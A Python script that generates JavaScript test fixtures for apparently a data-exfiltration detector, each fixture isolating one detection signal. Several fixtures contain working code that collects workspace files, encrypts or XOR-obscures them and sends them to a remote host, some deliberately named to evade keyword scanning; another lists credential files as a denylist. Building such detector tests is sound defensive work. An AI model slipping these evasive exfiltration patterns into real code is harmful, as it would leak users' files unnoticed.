# -*- coding: utf-8 -*-
"""生成 S5 的正交实验样本（S4 的反事实验证器）。

设计原则：**人为只改变一个变量**，让每一层的信息单独出现或缺失，
从而定位「哪一层缺失导致哪一种错误」。

  E0 基线      lexical ✓  semantic —  structural —   标准加密
  E1 discovery lexical ✗  语义完全自定义，无标准关键词
  E2 semantic  lexical ✓  带 denylist（测语义角色）
  E3 structural lexical ✓ 加密产物 → 上传（同对象字段引用）
  E4 ★         lexical ✗ 非标准加密 → 上传（测 structural 能否补 lexical）
  E5 aggreg.   lexical ✓ 48 处弱证据（测 aggregation/calibration）
"""

import os

ROOT = str(__import__("pathlib").Path(__file__).resolve().parents[2] / "tests" / "dogfood" / "s5-orthogonal")


def w(sub, name, body):
    d = os.path.join(ROOT, sub, "src")
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, name), "w", encoding="utf-8") as f:
        f.write(body.lstrip("\n"))
    with open(os.path.join(ROOT, sub, "package.json"), "w", encoding="utf-8") as f:
        f.write('{"name":"%s","version":"1.0.0","main":"src/index.js"}\n' % sub)


# ---------------------------------------------------------------- E0 基线
w("e0-baseline", "index.js", """
'use strict';
// E0 基线：标准实现 + 标准 API 名。
// 期望：工具应能确认「信封加密」并组合出外传链路。
const crypto = require('crypto');
const fs = require('fs');

function collectWorkspace(root) {
  const files = [];
  (function walk(dir) {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      const p = dir + '/' + e.name;
      if (e.isDirectory()) walk(p); else files.push(p);
    }
  })(root);
  return files;
}

function encryptArtifact(buf) {
  const key = crypto.randomBytes(32);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  return Buffer.concat([iv, cipher.update(buf), cipher.final()]);
}

async function uploadObject(target, body) {
  return fetch(target.url, { method: 'POST', headers: target.headers, body });
}

async function sync(root) {
  const files = collectWorkspace(root);
  const encrypted = encryptArtifact(Buffer.from(files.join('\\n')));
  return uploadObject({ url: 'https://oss.example.com/bucket', headers: {} }, encrypted);
}

module.exports = { sync };
""")

# ---------------------------------------------------------------- E1 discovery
w("e1-discovery", "index.js", """
'use strict';
// E1 discovery gap：真实行为存在，但**不使用任何标准关键词**。
//
// 目的：检验 lexical discovery 是否会完全失明。
// 所有名字都是自造的，标准 primitive（createCipheriv / fetch / archiver …）
// 一个都不出现；但行为等价于「读工作区 → 变换 → 发出」。
const nfs = require('fs');

// 自造的目录遍历
function gather(base) {
  const acc = [];
  const q = [base];
  while (q.length) {
    const cur = q.shift();
    for (const e of nfs.readdirSync(cur, { withFileTypes: true })) {
      const p = cur + '/' + e.name;
      if (e.isDirectory()) q.push(p); else acc.push(p);
    }
  }
  return acc;
}

// 自造的"变换"——名字与实现都不含标准术语
function spindle(buf, salt) {
  const out = Buffer.alloc(buf.length);
  for (let i = 0; i < buf.length; i++) out[i] = buf[i] ^ salt[(i % salt.length)];
  return out;
}

// 自造的"发出"——不用 fetch / axios / request 任何已知名
function transmit(knot, payload, done) {
  const link = require('net').connect({ host: knot.apex, port: knot.dock });
  link.on('connect', () => { link.end(payload); if (done) done(); });
}

async function run(root, knot) {
  const parts = gather(root);
  const blob = Buffer.from(parts.join('\\u0000'));
  const sealed = spindle(blob, Buffer.from([7, 3, 9, 1]));
  transmit(knot, sealed);
}

module.exports = { run };
""")

# ---------------------------------------------------------------- E2 semantic
w("e2-semantic", "index.js", """
'use strict';
// E2 semantic role：标准加密存在，同时出现 denylist。
//
// 目的：检验工具会不会把「排除列表」误读成「读取目标」。
// denylist 是**不处理**的名单，不是**要读**的文件。
const crypto = require('crypto');
const fs = require('fs');

// 明确的排除集合 —— 这些文件**绝不**纳入
const NEVER_INCLUDE = new Set([
  '.env', '.env.local', '.npmrc', 'id_rsa', 'id_ed25519',
  '.pem', '.p12', '.pfx', '.kube/config', 'credentials',
]);

function shouldSkip(name) {
  return NEVER_INCLUDE.has(name);
}

function collect(root) {
  const out = [];
  (function walk(dir) {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      if (shouldSkip(e.name)) continue;        // ← 命中即跳过，永不读取
      const p = dir + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}

function protect(buf) {
  const k = crypto.randomBytes(32), iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-gcm', k, iv);
  return Buffer.concat([iv, c.update(buf), c.final()]);
}

module.exports = { collect, protect };
""")

# ---------------------------------------------------------------- E3 structural
w("e3-structural", "index.js", """
'use strict';
// E3 structural：结构关系明确（同一对象字面量内的字段引用）。
//
// 目的：检验工具能否表达「加密产物的字节数直接进入上传参数」这种关系，
// 而不是只报 same_file。
const crypto = require('crypto');

function makeArtifact(plain) {
  const k = crypto.randomBytes(32), iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-gcm', k, iv);
  const body = Buffer.concat([iv, c.update(plain), c.final()]);
  return {
    encryptedBody: body,
    encryptedSizeBytes: body.length,      // ← 产物的派生字段
    algorithm: 'aes-256-gcm',
  };
}

async function uploadPutObject(artifact, sink) {
  // ↓ 直接引用 artifact 的派生字段，与加密函数同一条数据链
  const req = {
    url: sink.url,
    method: 'PUT',
    contentLength: artifact.encryptedSizeBytes,
    body: artifact.encryptedBody,
  };
  return fetch(req.url, { method: req.method, body: req.body });
}

async function sync(plain, sink) {
  const artifact = makeArtifact(plain);
  return uploadPutObject(artifact, sink);
}

module.exports = { sync, makeArtifact };
""")

# ---------------------------------------------------------------- E4 ★
w("e4-structural-bridges-lexical", "index.js", """
'use strict';
// E4 ★ 最有价值的实验：非标准加密 + 明确的结构关系。
//
// 目的：lexical 完全看不见时，structural 能否补上？
//
//   obscureSeal(data) → { sealedBlob, sealedSize }
//                              ↓ 同一对象字面量内引用
//   shipSealed({ payload: sealed.sealedBlob, bytes: sealed.sealedSize })
//
// 全流程不使用 createCipheriv / fetch / https.request / archiver 等标准名。
const nfs = require('fs');

// ---- 非标准"加密"（名字与调用都不含标准术语）----
function obscureSeal(plain) {
  const salt = nfs.readFileSync('/dev/urandom', { length: 16 }) || Buffer.alloc(16, 7);
  const out = Buffer.alloc(plain.length + 2);
  out[0] = plain.length & 0xff;
  for (let i = 0; i < plain.length; i++) out[i + 1] = plain[i] ^ salt[i % salt.length];
  out[out.length - 1] = 0x9c;
  return { sealedBlob: out, sealedSize: out.length, algo: 'obscure-v1' };
}

// ---- 非标准"发出"----
function shipSealed(pkg) {
  const link = require('tls').connect({ host: pkg.apex, port: 443 });
  link.on('secureConnect', () => { link.write(pkg.payload); link.end(); });
}

// ---- 调用点：结构关系在**同一对象字面量**内成立 ----
async function run(root, apex) {
  const files = [];
  (function walk(d) {
    for (const e of nfs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else files.push(p);
    }
  })(root);

  const sealed = obscureSeal(Buffer.from(files.join('\\n')));

  // ★ 关键：sealed 的字段被直接搬进发出函数的参数对象
  return shipSealed({
    apex: apex,
    payload: sealed.sealedBlob,
    bytes: sealed.sealedSize,
    meta: sealed.algo,
  });
}

module.exports = { run, obscureSeal, shipSealed };
""")

# ---------------------------------------------------------------- E5 aggregation
w("e5-aggregation", "index.js", """
'use strict';
// E5 aggregation / calibration：大量弱证据，但**没有真正的外传链路**。
//
// 目的：检验 raw evidence 很多时，verdict 是否仍然 absent
// （即 S4 遥测那 48 hits / score 1.48 的复现）。
//
// 这些字符串会被模式命中，但它们全是**日志/注释/文档**层面的提及，
// 不构成任何实际能力。
const fs = require('fs');

// 下面这些词只出现在注释与日志文案里
const DOC = `
telemetry: 本模块会上报 telemetry 事件（仅统计用途）
x-oss-signature: 文档里的字段名示例，未实现
aliyuncs.com: 文档中提到的域名，不用于任何请求
PutObject: 接口文档占位符
createCipheriv: 说明文字，本模块不加密
archiver: 参考实现链接，未引入
upload-credential: API 文档中的路径
snapshot/upload: 同上
.git/objects: 概念解释
`;

function log(msg) {
  // telemetry telemetry telemetry —— 只是日志，不上报
  process.stdout.write('[log] ' + msg + '\\n');
}

// 只有本地读取，没有任何出站
function readLocal(p) {
  try { return fs.readFileSync(p, 'utf-8'); } catch (e) { return ''; }
}

module.exports = { log, readLocal, DOC };
""")

print("生成完成：")
for d in sorted(os.listdir(ROOT)):
    p = os.path.join(ROOT, d)
    if os.path.isdir(p):
        n = sum(len(f) for _r, _s, f in os.walk(p))
        print("  %-36s %d 个文件" % (d, n))
